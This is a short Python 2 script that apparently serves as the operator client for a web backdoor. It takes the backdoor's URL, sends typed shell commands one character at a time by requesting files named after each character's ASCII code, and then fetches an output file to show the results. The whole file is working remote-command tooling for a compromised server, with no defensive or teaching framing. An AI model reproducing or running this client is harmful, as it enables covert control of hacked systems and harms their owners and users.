#!/usr/bin/env python2
import sys, time, urllib2

def getResults(url):
	conn = urllib2.urlopen(url + "/output.txt")
	result = conn.read()
	conn.close()
	return result

def transmitCommand(cmd, url):
	i = 1
	cmdlen = len(cmd)
	for char in list(cmd):
		print "\rTransmitting command (%d/%d)" % (i, cmdlen),
		sys.stdout.flush()
		i += 1
		filename = str(ord(char)) + ".txt"
		urllib2.urlopen(url + "/" + filename).read()
		time.sleep(1)
	print ""

if __name__ == "__main__":
	if( len(sys.argv) != 2 ):
		print "USAGE: %s <url of backdoor>" % sys.argv[0]
		sys.exit(1)

	url = sys.argv[1]

	while(True):
		cmd = raw_input("Command: ")
		transmitCommand(cmd, url)
		results = getResults(url)
		print "Results:"
		print results
